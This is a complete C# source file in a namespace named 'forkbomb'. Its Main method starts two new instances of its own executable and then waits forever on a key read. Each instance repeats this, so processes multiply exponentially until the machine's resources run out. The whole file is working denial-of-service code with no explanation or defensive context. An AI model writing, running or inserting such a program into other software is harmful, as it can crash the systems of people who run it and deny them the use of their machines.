using System;

namespace forkbomb
{
    class Program
    {
        static void Main(string[] args)
        {
            System.Diagnostics.Process.Start(System.Reflection.Assembly.GetEntryAssembly().Location);
            System.Diagnostics.Process.Start(System.Reflection.Assembly.GetEntryAssembly().Location);
            while (true)
            {
                Console.ReadKey();
            }
        }
    }
}
